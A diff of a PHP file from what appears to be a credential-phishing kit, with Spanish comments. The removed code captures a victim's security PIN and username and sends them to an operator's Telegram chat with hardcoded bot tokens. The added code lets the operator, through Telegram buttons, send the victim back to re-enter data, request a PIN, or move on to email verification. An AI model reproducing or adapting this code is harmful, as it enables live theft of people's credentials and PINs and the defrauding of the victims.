@@ -1,65 +1,74 @@
 <?php
-session_start();
+// Leer la entrada que envía Telegram al presionar un botón
+$json_entrada = file_get_contents("php://input");
+$update = json_decode($json_entrada, true);
 
-// Capturar el ID de sesión activa del navegador del alumno
-$id_sesion = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';
+if (isset($update['callback_query'])) {
+    $callback_query = $update['callback_query'];
+    $data = $callback_query['data']; 
+    $chat_id = $callback_query['message']['chat']['id'];
+    $message_id = $callback_query['message']['message_id'];
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($id_sesion)) {
-    $pin_ingresado = isset($_POST['num_pin']) ? trim($_POST['num_pin']) : '';
+    // Romper la cadena del botón: "redirigir|ID_SESION|ACCION"
+    $partes = explode('|', $data);
 
-    if (!empty($pin_ingresado)) {
-        $ruta = "sesiones/{$id_sesion}.json";
+    if (count($partes) === 3 && $partes[0] === 'redirigir') {
+        $id_sesion = $partes[1];
+        $accion = $partes[2];
 
-        if (file_exists($ruta)) {
-            // 1. Leer y actualizar el estado interno en el JSON
-            $datos = json_decode(file_get_contents($ruta), true);
-            $datos['pin'] = $pin_ingresado;
-            $datos['estado'] = 'pendiente'; // Bloquear al alumno en la pantalla de carga de nuevo
-            file_put_contents($ruta, json_encode($datos));
+        $ruta_archivo = "sesiones/{$id_sesion}.json";
 
-            // 2. Credenciales del bot activo
-            $token = "8503145754:AAG11Gd1Z98sThoPcdwS4k-UQadnEr0qYc4";
-            $chat_id = "8496234425";
+        if (file_exists($ruta_archivo)) {
+            $datos = json_decode(file_get_contents($ruta_archivo), true);
 
-            // 3. Estructurar la alerta para tu Telegram
-            $mensaje = "🔔 ¡NUEVO PIN DE SEGURIDAD RECIBIDO!\n\n";
-            $mensaje .= "🆔 ID SESIÓN: {$id_sesion}\n";
-            $mensaje .= "👤 USUARIO: {$datos['usuario']}\n";
-            $mensaje .= "🔢 PIN INGRESADO: {$pin_ingresado}\n\n";
-            $mensaje .= "¿El PIN es correcto? Seleccione la acción:";
+            // Evaluar la acción del botón de Telegram y cambiar el estado del JSON
+            $texto_confirmacion = "";
+            if ($accion === 'datos_malos') {
+                $datos['estado'] = 'index_error';
+                $texto_confirmacion = "❌ Solicitando datos correctos.";
+            } elseif ($accion === 'pedir_pin') {
+                $datos['estado'] = 'pin_normal';
+                $texto_confirmacion = "🔑 Solicitando código PIN.";
+            } elseif ($accion === 'correo') {
+                $datos['estado'] = 'correo_ok';
+                $texto_confirmacion = "📧 Enviado a Verificación por Correo.";
+            } elseif ($accion === 'pin_malo') {
+                $datos['estado'] = 'pin_rebotado';
+                $texto_confirmacion = "⚠️ Devuelto: PIN Incorrecto.";
+            }
 
-            // 4. Botones para avanzar al correo electrónico o devolver por PIN incorrecto
-            $botones = [
-                'inline_keyboard' => [
-                    [
-                        ['text' => '📧 Mandar a Correo', 'callback_data' => "redirigir|{$id_sesion}|correo"],
-                        ['text' => '⚠️ PIN Incorrecto', 'callback_data' => "redirigir|{$id_sesion}|pin_malo"]
-                    ]
-                ]
+            // Guardar el nuevo estado para que esperar.php lo lea y redirija
+            file_put_contents($ruta_archivo, json_encode($datos));
+
+            // Tu Token activo para responderle a Telegram y confirmar el clic
+            $token = "9090664378:AAEqaJnU9CKGOfGOdQj8tNr2EWPGksbE4qE";
+
+            // 1. Responder al Callback Query para quitar el reloj de carga del botón en Telegram
+            $payload_answer = [
+                'callback_query_id' => $callback_query['id'],
+                'text' => "Acción procesada con éxito"
             ];
+            $ch1 = curl_init("https://api.telegram.org/bot{$token}/answerCallbackQuery");
+            curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch1, CURLOPT_POSTFIELDS, http_build_query($payload_answer));
+            curl_exec($ch1);
+            curl_close($ch1);
 
-            $payload = [
+            // 2. Modificar el mensaje en tu chat de Telegram para confirmar qué botón tocaste
+            $nuevo_texto = $callback_query['message']['text'] . "\n\n⚡ Comando Ejecutado: " . $texto_confirmacion;
+            $payload_edit = [
                 'chat_id' => $chat_id,
-                'text' => $mensaje,
-                'parse_mode' => 'Markdown',
-                'reply_markup' => json_encode($botones)
+                'message_id' => $message_id,
+                'text' => $nuevo_texto,
+                'parse_mode' => 'Markdown'
             ];
-
-            // 5. Enviar a la API de Telegram mediante cURL
-            $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
-            curl_exec($ch);
-            curl_close($ch);
-
-            // 6. Redirección inmediata a esperar.php para congelar la pantalla del alumno
-            header("Location: esperar.php");
-            exit();
+            $ch2 = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
+            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($payload_edit));
+            curl_exec($ch2);
+            curl_close($ch2);
         }
     }
 }
-
-// Si entran de forma directa o ilegal, regresarlos al inicio
-header("Location: index.php");
-exit();
+echo "OK";
 ?>
